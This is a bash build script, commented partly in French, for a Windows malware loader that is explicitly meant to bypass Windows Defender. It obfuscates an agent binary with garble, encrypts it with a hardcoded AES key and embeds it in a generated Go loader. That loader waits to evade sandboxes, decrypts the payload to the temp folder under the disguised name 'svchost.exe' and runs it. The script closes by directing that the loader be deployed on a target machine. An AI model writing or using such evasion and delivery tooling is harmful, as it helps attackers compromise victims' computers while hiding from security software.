#!/bin/bash

set -e

echo "[*] Building encrypted loader for Windows Defender bypass"
echo "============================================="

# 1. Compiler l'agent avec garble (obfuscation)
echo "[1/5] Compiling agent with garble obfuscation..."
GOOS=windows GOARCH=amd64 garble -tiny -literals -seed=random build -o build/windows/agent_obfuscated.exe ./cmd/agent
echo "    [+] Agent obfuscated: build/windows/agent_obfuscated.exe"

# 2. Chiffrer l'agent avec OpenSSL
echo "[2/5] Encrypting agent with AES-256..."
openssl enc -aes-256-cbc -salt -in build/windows/agent_obfuscated.exe -out build/windows/agent_encrypted.bin -k "MySecretKey12345MySecretKey12345" -pbkdf2
echo "    [+] Agent encrypted: build/windows/agent_encrypted.bin"

# 3. Encoder en base64
echo "[3/5] Encoding to base64..."
base64 -i build/windows/agent_encrypted.bin -o build/windows/agent_b64.txt
echo "    [+] Agent encoded: build/windows/agent_b64.txt"

# 4. Créer un loader simple en Go
echo "[4/5] Creating simple loader..."
cat > cmd/simple_loader/main.go << 'EOF'
package main

import (
	"encoding/base64"
	"io/ioutil"
	"os"
	"os/exec"
	"path/filepath"
	"time"
)

// Agent chiffré (OpenSSL AES-256-CBC)
const encryptedB64 = "ENCRYPTED_PAYLOAD_PLACEHOLDER"

func main() {
	// Sleep anti-sandbox
	time.Sleep(10 * time.Second)
	
	// Decode base64
	encrypted, _ := base64.StdEncoding.DecodeString(encryptedB64)
	
	// Déchiffrer avec OpenSSL
	tempEncrypted := filepath.Join(os.TempDir(), "data.tmp")
	tempDecrypted := filepath.Join(os.TempDir(), "svchost.exe")
	
	ioutil.WriteFile(tempEncrypted, encrypted, 0644)
	
	// Déchiffrer avec openssl (doit être installé sur la cible)
	cmd := exec.Command("openssl", "enc", "-aes-256-cbc", "-d", "-in", tempEncrypted, "-out", tempDecrypted, "-k", "MySecretKey12345MySecretKey12345", "-pbkdf2")
	cmd.Run()
	
	// Exécuter
	cmd2 := exec.Command(tempDecrypted)
	cmd2.Start()
	
	// Cleanup
	os.Remove(tempEncrypted)
}
EOF

# 5. Injecter le payload dans le loader
echo "[5/5] Injecting encrypted payload into loader..."
PAYLOAD=$(cat build/windows/agent_b64.txt)
sed "s|ENCRYPTED_PAYLOAD_PLACEHOLDER|$PAYLOAD|g" cmd/simple_loader/main.go > cmd/simple_loader/main_final.go
mv cmd/simple_loader/main_final.go cmd/simple_loader/main.go

# 6. Compiler le loader
echo "[6/6] Compiling final loader..."
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o build/windows/loader.exe ./cmd/simple_loader

echo ""
echo "============================================="
echo "[+] BUILD COMPLETE!"
echo ""
echo "Files generated:"
echo "  - build/windows/agent_obfuscated.exe  (obfuscated agent)"
echo "  - build/windows/loader.exe            (encrypted loader)"
echo ""
echo "Deploy 'loader.exe' on target Windows machine"
echo "============================================="
